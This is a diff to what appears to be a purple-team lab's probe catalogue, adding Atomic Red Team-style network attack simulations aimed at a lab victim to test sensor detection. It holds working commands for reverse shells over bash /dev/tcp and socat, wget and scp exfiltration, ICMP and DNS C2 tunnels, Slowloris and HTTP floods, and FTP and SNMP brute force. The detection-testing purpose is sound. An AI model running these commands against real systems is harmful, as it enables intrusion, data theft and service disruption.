@@ -1035,3 +1035,407 @@ probes:
     command: |
       timeout 60 nuclei -u "http://{{VICTIM_IP}}" -tags exposure -severity medium,high,critical \
         -rate-limit 5 -c 3 -silent 2>&1 | head -20
+
+  # ========================================================================
+  # Atomic Red Team — Linux atomics (network-observable subset)
+  #
+  # All entries below are tagged `source: atomic-red-team` + `art_test: "T#### #N"`
+  # so the agent can focus-filter on them. Trigger via:
+  #   python purple_agent.py ... --focus "prioritize probes where source: atomic-red-team"
+  # or via chat shorthand "run atomic red team testing".
+  #
+  # Selected from redcanaryco/atomic-red-team for Linux tests that produce
+  # clear packet-level signal. Pairs with TIER2 attacker toolkit
+  # (attacker_setup.sh) + victim listeners (victim_setup.sh).
+  # ========================================================================
+
+  # ---- Tunnel services (Tier B — SNI gap beyond ngrok) -------------------
+
+  - name: art-cloudflared-tunnel
+    category: tunneling
+    mitre: T1572
+    source: atomic-red-team
+    art_test: "T1572 #7"
+    rationale: "cloudflared ephemeral tunnel — TLS SNI *.trycloudflare.com"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      # Ephemeral tunnel attempt — generates TLS to *.trycloudflare.com.
+      # Exits quickly without a real local service; 10s cap prevents hang.
+      timeout 10 cloudflared tunnel --url http://localhost:80 2>&1 | tail -10 || true
+      echo "cloudflared tunnel attempt completed — expect SNI *.trycloudflare.com"
+
+  - name: art-devtunnels-ms
+    category: tunneling
+    mitre: T1572
+    source: atomic-red-team
+    art_test: "T1572 #5"
+    rationale: "Microsoft Dev Tunnels — SNI *.devtunnels.ms / tunnels.api.visualstudio.com"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      # Direct endpoint probe — TLS SNI to known Dev Tunnels API vhosts.
+      # devtunnel binary itself requires Azure login; curl bypasses that for pure SNI signal.
+      curl -sS --max-time 5 "https://global.rel.tunnels.api.visualstudio.com/api/v1/tunnels" -o /dev/null 2>&1 || true
+      curl -sS --max-time 5 "https://devtunnels.ms/" -o /dev/null 2>&1 || true
+      echo "Dev Tunnels SNI handshakes sent"
+
+  - name: art-vscode-tunnel
+    category: tunneling
+    mitre: T1572
+    source: atomic-red-team
+    art_test: "T1572 #6"
+    rationale: "VSCode `code tunnel` — GitHub device-code + *.tunnels.api.visualstudio.com"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      # `code tunnel` triggers GitHub device-code flow first; sensor sees SNI
+      # github.com/login/device then the tunnels endpoint if login completes.
+      timeout 10 code tunnel --accept-server-license-terms 2>&1 | head -15 || true
+      echo "VSCode tunnel attempt completed"
+
+  # ---- Unique-protocol gaps (Tier C) -------------------------------------
+
+  - name: art-whois-tunnel
+    category: c2-raw
+    mitre: T1105
+    source: atomic-red-team
+    art_test: "T1105 #14"
+    rationale: "whois-as-tunnel — raw TCP/8443 with whois protocol bytes (ART T1105 #14)"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      # Abuse whois client to open raw TCP socket on non-standard port with plaintext payload.
+      # Lands on victim's :8443 TLS listener but speaks whois (plaintext) — protocol mismatch.
+      timeout 5 whois -h {{VICTIM_IP}} -p 8443 "Hello from Atomic Red Team test T1105" 2>&1 | head -5 || true
+      echo "whois tunnel probe sent to {{VICTIM_IP}}:8443"
+
+  - name: art-rsync-daemon-pull
+    category: exfil
+    mitre: T1105
+    source: atomic-red-team
+    art_test: "T1105 #1"
+    rationale: "rsync daemon anonymous pull on :873 — @RSYNCD protocol banner, no Zeek analyzer"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      # List modules (handshake) then pull content from [public] anon module.
+      # Generates TCP/873 flow with @RSYNCD: banner — detectable only by raw-protocol rule.
+      timeout 5 rsync --list-only "rsync://{{VICTIM_IP}}/" 2>&1 | head -10 || true
+      mkdir -p /tmp/art-rsync-pull
+      timeout 8 rsync -av "rsync://{{VICTIM_IP}}/public/" /tmp/art-rsync-pull/ 2>&1 | head -10 || true
+      rm -rf /tmp/art-rsync-pull
+
+  - name: art-scp-over-ssh-exfil
+    category: exfil
+    mitre: T1048
+    source: atomic-red-team
+    art_test: "T1048 #3"
+    rationale: "scp exfil over SSH — asymmetric flow shape indicative of bulk staging"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      # SCP push attempt — fails auth (BatchMode=yes) but generates SSH flow to :22.
+      # Baseline for detecting tar-over-SSH / scp exfil patterns.
+      timeout 5 scp -o StrictHostKeyChecking=no -o PasswordAuthentication=no \
+        -o BatchMode=yes -o ConnectTimeout=3 \
+        /etc/hostname "ubuntu@{{VICTIM_IP}}:/tmp/art-loot" 2>&1 | head -5 || true
+      echo "scp exfil attempt completed (expected auth fail, SSH flow generated)"
+
+  - name: art-icmpdoor-c2
+    category: c2-icmp
+    mitre: T1095
+    source: atomic-red-team
+    art_test: "T1095 #4"
+    rationale: "icmpdoor full ICMP C2 tunnel — sustained bidirectional echo payloads (ART T1095 #4)"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      # icmpdoor binary pre-installed at /opt/icmpdoor/ via attacker_setup.sh.
+      # Needs sudo (raw sockets); timeout prevents hang since icmp-cnc isn't running.
+      timeout 8 sudo /opt/icmpdoor/icmpdoor --interface eth0 --destination_ip {{VICTIM_IP}} 2>&1 | head -10 || true
+      echo "icmpdoor sent — expect sustained bidirectional ICMP to victim"
+
+  # ---- SaaS exfil (Tier D) -----------------------------------------------
+
+  - name: art-wget-post-https-exfil
+    category: exfil
+    mitre: T1048.002
+    source: atomic-red-team
+    art_test: "T1048.002 #3"
+    rationale: "wget --post-file HTTPS exfil — distinctive Wget JA3 + TLS POST body"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      # wget exfil of /etc/hostname over HTTPS to victim's :8443 listener.
+      # Generates Wget-specific JA3 + TLS client fingerprint (not browser JA3).
+      timeout 5 wget --post-file=/etc/hostname --timeout=5 --no-check-certificate \
+        "https://{{VICTIM_IP}}:8443/" -O /dev/null 2>&1 | head -10 || true
+      echo "wget HTTPS exfil completed"
+
+  - name: art-rclone-s3-sni
+    category: exfil-saas
+    mitre: T1567.002
+    source: atomic-red-team
+    art_test: "T1567.002 #2"
+    rationale: "rclone UA + AWS S3 SNI — cloud exfil fingerprint"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      # Generate rclone User-Agent + S3 SNI handshake (known exfil pattern).
+      # Real rclone config requires creds; curl replay is sufficient for UA+SNI signal.
+      curl -sS --max-time 3 -A 'rclone/v1.69.3' \
+        "https://fake-atomic-test.s3.us-east-1.amazonaws.com/" -o /dev/null 2>&1 || true
+      echo "rclone-style S3 exfil SNI sent"
+
+  # ---- Scanning / discovery ----------------------------------------------
+
+  - name: art-gobuster-dvwa-dir-enum
+    category: scanning
+    mitre: T1595.003
+    source: atomic-red-team
+    art_test: "T1595.003 (gobuster)"
+    rationale: "gobuster directory brute-force against DVWA :8081 — rapid 404 burst + UA"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      # DVWA on :8081 (from victim_setup.sh) gives gobuster a real directory tree
+      # to enumerate vs. nginx's single-endpoint response. Produces ~4400 GETs/UA.
+      timeout 30 gobuster dir -u "http://{{VICTIM_IP}}:8081" \
+        -w /usr/share/wordlists/dirb/common.txt -q -t 10 --no-color \
+        --timeout 3s 2>&1 | tail -15 || true
+
+  - name: art-masscan-syn-burst
+    category: scanning
+    mitre: T1046
+    source: atomic-red-team
+    art_test: "T1046 (masscan)"
+    rationale: "masscan fast SYN scan — 1000pps burst, timing distinct from nmap"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      # masscan rate limit 1000pps — noticeably faster than nmap default.
+      # Targets victim's known listening ports; sensor should see SYN burst on conn.log.
+      timeout 20 sudo masscan {{VICTIM_IP}} -p 22,80,443,445,3389,8080,8081,8443 \
+        --rate 1000 --wait 0 2>&1 | tail -10 || true
+
+  # ---- Reverse-shell variants (T1059.004 flow fingerprints) --------------
+
+  - name: art-socat-tls-reverse-shell
+    category: c2-raw
+    mitre: T1059.004
+    source: atomic-red-team
+    art_test: "T1059.004 (socat TLS)"
+    rationale: "socat TLS reverse-shell connect — distinct JA3 vs. nc baseline"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      # socat TLS outbound to uncommon port — generates TLS handshake with
+      # socat-specific JA3 fingerprint (not browser, not nc, not curl).
+      timeout 5 bash -c 'echo "id" | socat - OPENSSL-CONNECT:{{VICTIM_IP}}:4444,verify=0' 2>&1 | head -5 || true
+      echo "socat TLS reverse shell attempt completed"
+
+  - name: art-bash-dev-tcp-reverse-shell
+    category: c2-raw
+    mitre: T1059.004
+    source: atomic-red-team
+    art_test: "T1059.004 (bash /dev/tcp)"
+    rationale: "Pure-bash /dev/tcp reverse shell — no binary fingerprint, flow-only"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      # Fileless reverse shell pattern — bash opens /dev/tcp, pipes shell.
+      # No User-Agent, no binary hash; only the flow shape on conn.log.
+      timeout 3 bash -c 'exec 3<>/dev/tcp/{{VICTIM_IP}}/4445; echo "/bin/sh -i" >&3; sleep 1; exec 3<&-' 2>&1 || true
+      echo "bash /dev/tcp reverse shell pattern sent to :4445"
+
+  # ---- High-confidence regression (should DETECT) ------------------------
+
+  - name: art-malicious-ua-fanout
+    category: c2-modern
+    mitre: T1071.001
+    source: atomic-red-team
+    art_test: "T1071.001 #3"
+    rationale: "Classic APT-simulator User-Agent fan-out — ET MALWARE HttpBrowser etc."
+    expected_sids: []
+    expected_verdict: DETECTED
+    already_in_catalog: false
+    command: |
+      # Four APT-characteristic UAs; HttpBrowser/1.0 and *<|>* have ET rules.
+      # High-confidence regression validator — if these don't fire, ET snapshot is stale.
+      curl -sS --max-time 3 -A 'HttpBrowser/1.0' "http://{{VICTIM_IP}}/" >/dev/null 2>&1 || true
+      curl -sS --max-time 3 -A 'Wget/1.9+cvs-stable (Red Hat modified)' "http://{{VICTIM_IP}}/" >/dev/null 2>&1 || true
+      curl -sS --max-time 3 -A 'Opera/8.81 (Windows NT 6.0; U; en)' "http://{{VICTIM_IP}}/" >/dev/null 2>&1 || true
+      curl -sS --max-time 3 -A '*<|>*' "http://{{VICTIM_IP}}/" >/dev/null 2>&1 || true
+      echo "4 malicious UAs sent"
+
+  # ---- Anonymity / proxy -------------------------------------------------
+
+  - name: art-tor-bootstrap
+    category: tunneling
+    mitre: T1090.003
+    source: atomic-red-team
+    art_test: "T1090.003 #3"
+    rationale: "Tor client bootstrap — directory-authority TLS, ET TOR reputation hits"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      # Foreground tor with root-owned temp data dir. Without `sudo mktemp`
+      # the directory ends up owned by the invoking user and tor refuses it
+      # with "data directory is not owned by this user" before any network
+      # traffic is generated — hence the sudo below (fixes prior run bug).
+      TORDIR=$(sudo mktemp -d /tmp/art-tor-XXXXXX)
+      timeout 15 sudo tor --DataDirectory "$TORDIR" --SocksPort 9051 --Log 'notice stderr' 2>&1 | head -15 || true
+      sudo rm -rf "$TORDIR" 2>/dev/null || true
+      echo "tor bootstrap completed — expect ET TOR on DA IPs"
+
+  # ---- Batch 2: exercise idle attacker tools + new victim listeners ------
+  # Drawn from the same ART-research second pass. Some have no matching ART
+  # atomic (T1498/T1499/T1557 have zero in the repo) — in those cases the
+  # art_test field references the parent technique with "(community)" to be
+  # honest about provenance.
+
+  - name: art-ffuf-dvwa-dir-enum
+    category: scanning
+    mitre: T1595.003
+    source: atomic-red-team
+    art_test: "T1595 parent (ffuf community)"
+    rationale: "ffuf content discovery vs DVWA — distinct UA Fuzz Faster u Fool + 404 burst"
+    expected_sids: []
+    expected_verdict: DETECTED
+    already_in_catalog: false
+    command: |
+      timeout 30 ffuf -u "http://{{VICTIM_IP}}:8081/FUZZ" \
+        -w /usr/share/wordlists/dirb/common.txt -t 40 -mc 200,301,302 \
+        -s -noninteractive 2>&1 | tail -15 || true
+
+  - name: art-slowhttptest-slowloris
+    category: dos
+    mitre: T1499.002
+    source: atomic-red-team
+    art_test: "T1499.002 (community — no ART atomic)"
+    rationale: "Slowloris slow-headers DoS vs nginx :80 — ET POLICY Slowloris"
+    expected_sids: []
+    expected_verdict: DETECTED
+    already_in_catalog: false
+    command: |
+      # Slowloris: 500 half-open HTTP connections held with slow header delivery.
+      # Held 30s to generate measurable signal without full service impact.
+      timeout 45 slowhttptest -c 500 -H -i 10 -r 200 -t GET \
+        -u "http://{{VICTIM_IP}}/" -x 24 -p 3 -l 30 2>&1 | tail -10 || true
+
+  - name: art-ab-http-flood-dvwa
+    category: dos
+    mitre: T1499.003
+    source: atomic-red-team
+    art_test: "T1499.003 (community — no ART atomic)"
+    rationale: "ApacheBench flood vs DVWA — UA ApacheBench/x.x + high request rate"
+    expected_sids: []
+    expected_verdict: DETECTED
+    already_in_catalog: false
+    command: |
+      # Bounded flood: 5000 req @ 50 concurrency against DVWA login endpoint.
+      # ET 2011716 catches the distinctive ApacheBench UA.
+      timeout 20 ab -n 5000 -c 50 -r -q "http://{{VICTIM_IP}}:8081/login.php" 2>&1 | tail -15 || true
+
+  - name: art-dnscat-dns-tunnel
+    category: dns-tunnel
+    mitre: T1071.004
+    source: atomic-red-team
+    art_test: "T1071.004 #3"
+    rationale: "dnscat2 client handshake — long base32 subdomain queries, QTYPE diversity"
+    expected_sids: []
+    expected_verdict: DETECTED
+    already_in_catalog: false
+    command: |
+      # dnscat2 client tries to beacon out; without a server it'll emit initial
+      # queries then retry — enough signal for ET 2027869 / Zeek long-subdomain.
+      timeout 15 dnscat --dns "server={{VICTIM_IP}},port=53" \
+        --secret=purple-lab-atomic purple-dnscat.example.com 2>&1 | head -15 || true
+
+  - name: art-hydra-ftp-brute
+    category: bruteforce
+    mitre: T1110.001
+    source: atomic-red-team
+    art_test: "T1110.001"
+    rationale: "FTP password brute vs vsftpd :21 — exercises new anonymous listener auth path"
+    expected_sids: []
+    expected_verdict: DETECTED
+    already_in_catalog: false
+    command: |
+      # Small wordlists to stay under 30s; anonymous is enabled so user=anonymous
+      # might succeed, but 'admin' / 'root' with common passwords exercises the
+      # brute-force signal path (ET 2002383 / Zeek ftp.log PASS failures).
+      printf 'admin\nroot\nftp\nanonymous\n'  > /tmp/art-ftp-users.txt
+      printf 'password\n123456\nadmin\nftp\n' > /tmp/art-ftp-pass.txt
+      timeout 30 hydra -L /tmp/art-ftp-users.txt -P /tmp/art-ftp-pass.txt \
+        -t 4 "ftp://{{VICTIM_IP}}" 2>&1 | tail -10 || true
+      rm -f /tmp/art-ftp-users.txt /tmp/art-ftp-pass.txt
+
+  - name: art-snmp-community-brute
+    category: bruteforce
+    mitre: T1110.001
+    source: atomic-red-team
+    art_test: "T1110.001 (SNMP community — community probe)"
+    rationale: "SNMP community string enumeration — ET rules on repeated SNMP GetRequest with varying communities"
+    expected_sids: []
+    expected_verdict: DETECTED
+    already_in_catalog: false
+    command: |
+      # Sequential SNMP GET with common community strings against victim's :161.
+      # 'public' is accepted (victim config) so one succeeds; others fail.
+      # ET 2001036 keys on the rate/diversity of community strings in flight.
+      for c in public private admin cisco snmp community manager monitor default; do
+        timeout 2 snmpget -v1 -c "$c" "{{VICTIM_IP}}" 1.3.6.1.2.1.1.1.0 2>&1 | head -1
+      done
+
+  - name: art-remote-access-software-sni
+    category: identity-abuse
+    mitre: T1219
+    source: atomic-red-team
+    art_test: "T1219 (multi-tool SNI sweep)"
+    rationale: "AnyDesk/TeamViewer/RustDesk/Atera SNI — T1219 remote access software fingerprinting"
+    expected_sids: []
+    expected_verdict: DETECTED
+    already_in_catalog: false
+    command: |
+      # Openssl s_client TLS handshake with SNI (no data exchange needed).
+      # AnyDesk, TeamViewer SNIs have ET rules; RustDesk + Atera are gaps.
+      for domain in anydesk.com teamviewer.com master7.teamviewer.com \
+                    rustdesk.com agent.atera.com instance.screenconnect.com; do
+        echo "--- $domain ---"
+        timeout 5 openssl s_client -connect "$domain:443" -servername "$domain" \
+          </dev/null 2>/dev/null | head -3
+      done
+
+  - name: art-knock-port-knock-sequence
+    category: evasion
+    mitre: T1205.001
+    source: atomic-red-team
+    art_test: "T1205.001 (community — no ART atomic)"
+    rationale: "Port knock sequence — 4 rapid TCP SYNs to closed high ports then SSH"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      # Classic 3-4 port knock sequence; no knockd on victim so all SYNs get RST.
+      # Signal is the *ordered pattern* of SYNs to closed ports — Zeek custom
+      # script territory (existing scan detectors likely won't flag 4 packets).
+      knock -v "{{VICTIM_IP}}" 7000 8000 9000 1234 2>&1 | head -5 || true
+      # Follow-up SSH attempt — the pattern a real knockd client would produce
+      timeout 3 bash -c "echo QUIT | nc -w 2 {{VICTIM_IP}} 22" 2>&1 | head -2 || true
+      echo "port knock sequence sent — expect conn.log burst to 7000/8000/9000/1234"
